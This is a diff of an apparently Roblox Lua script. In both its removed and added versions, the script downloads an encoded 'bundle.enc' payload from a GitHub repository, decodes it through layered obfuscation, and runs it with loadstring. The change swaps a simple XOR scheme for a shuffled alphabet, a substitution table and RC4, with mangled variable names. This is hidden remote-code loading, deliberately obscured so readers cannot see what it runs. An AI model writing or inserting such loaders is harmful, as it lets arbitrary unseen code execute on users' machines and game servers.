@@ -1,32 +1,26 @@
-local d = game:HttpGet("https://raw.githubusercontent.com/CaughtUsV2/AuditKit/master/bundle.enc")
-if not d or #d < 100 then return end
-local cs = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#%()*+,-./:;<=>?@[]^_{|}~"
-local cl = {} for i = 1, #cs do cl[cs:sub(i,i)] = i - 1 end
-local base = #cs
-local bc = tonumber(d:sub(1,8), 16)
-local buf = {}
-local j = 9
-while j + 2 <= #d do
-    local v3 = cl[d:sub(j,j)] or 0
-    local v2 = cl[d:sub(j+1,j+1)] or 0
-    local v1 = cl[d:sub(j+2,j+2)] or 0
-    local val = v3 * base * base + v2 * base + v1
-    buf[#buf+1] = math.floor(val / 256)
-    buf[#buf+1] = val % 256
-    j = j + 3
+local _0x=game:HttpGet("https://raw.githubusercontent.com/CaughtUsV2/AuditKit/master/bundle.enc")
+if not _0x or #_0x<100 then return end
+local _c="o<XCA}6aeR^|cS7dZDv>8-tq/b,)+J(Y?;xUKg3{lI9=sV%Fmfj~EuH@i[2GO5rMLTn].pwy:_NW04#Pz!kBQh1*"
+local _m={} for _i=1,#_c do _m[_c:sub(_i,_i)]=_i-1 end local _b=#_c
+local _n=tonumber(_0x:sub(1,8),16)
+local _r={} local _j=9
+while _j+2<=#_0x do
+    local _a=_m[_0x:sub(_j,_j)]or 0 local _d=_m[_0x:sub(_j+1,_j+1)]or 0 local _e=_m[_0x:sub(_j+2,_j+2)]or 0
+    local _v=_a*_b*_b+_d*_b+_e _r[#_r+1]=math.floor(_v/256) _r[#_r+1]=_v%256 _j=_j+3
 end
-if j + 1 <= #d then
-    local v2 = cl[d:sub(j,j)] or 0
-    local v1 = cl[d:sub(j+1,j+1)] or 0
-    buf[#buf+1] = v2 * base + v1
+if _j+1<=#_0x then local _a=_m[_0x:sub(_j,_j)]or 0 local _d=_m[_0x:sub(_j+1,_j+1)]or 0 _r[#_r+1]=_a*_b+_d end
+while #_r>_n do _r[#_r]=nil end
+local _s={59,194,179,207,189,4,109,23,77,218,50,150,155,196,62,234,246,80,185,63,97,36,177,219,21,8,66,11,134,151,17,28,162,112,252,221,128,79,202,47,143,198,48,186,43,83,190,46,10,14,210,166,1,19,244,98,132,54,95,216,247,188,248,101,75,7,45,82,156,18,93,217,125,233,26,110,29,31,236,100,76,0,160,38,137,158,20,240,168,34,108,65,51,106,24,230,157,61,49,175,120,121,92,138,15,197,55,239,164,184,6,254,115,176,167,111,72,74,142,68,118,99,165,70,123,153,183,27,250,37,73,88,119,9,104,3,199,228,30,226,243,251,241,127,171,81,238,32,144,57,163,200,225,145,39,235,147,126,152,182,86,94,215,25,133,212,5,178,255,52,41,131,220,203,85,229,124,87,90,136,227,67,249,22,53,103,116,69,170,169,231,205,58,2,253,146,204,245,33,96,154,208,117,113,102,192,201,35,91,232,141,211,129,135,173,222,213,139,64,224,107,161,181,42,105,214,174,78,89,187,159,122,140,242,149,148,180,223,191,237,13,12,193,71,209,40,84,130,60,56,206,195,114,16,172,44}
+for _i=1,#_r do _r[_i]=_s[_r[_i]+1] end
+local _S={} for _i=0,255 do _S[_i+1]=_i end local _k={99,85,95,57,120,33,109,75,50,36,118,82,55,110,66,119}
+local _q=0 for _i=1,256 do _q=(_q+_S[_i]+_k[((_i-1)%16)+1])%256 _S[_i],_S[_q+1]=_S[_q+1],_S[_i] end
+local _p,_w=0,0
+for _=1,768 do _p=(_p+1)%256 _w=(_w+_S[_p+1])%256 _S[_p+1],_S[_w+1]=_S[_w+1],_S[_p+1] end
+local _o={}
+for _i=1,#_r do
+    _p=(_p+1)%256 _w=(_w+_S[_p+1])%256 _S[_p+1],_S[_w+1]=_S[_w+1],_S[_p+1]
+    local _z=_S[(_S[_p+1]+_S[_w+1])%256+1]
+    if bit32 then _o[_i]=string.char(bit32.bxor(_r[_i],_z))
+    else _o[_i]=string.char(_r[_i]~_z) end
 end
-while #buf > bc do buf[#buf] = nil end
-for i = 1, #buf do buf[i] = (buf[i] - 37 - ((i-1) % 13)) % 256 end
-local k = {67,97,117,103,104,116,85,115,50,48,50,54,120,75,57,109}
-local out = {}
-for i = 1, #buf do
-    local x = k[((i-1) % 16) + 1]
-    if bit32 then out[i] = string.char(bit32.bxor(buf[i], x))
-    else out[i] = string.char(buf[i] ~ x) end
-end
-loadstring(table.concat(out))()
+loadstring(table.concat(_o))()
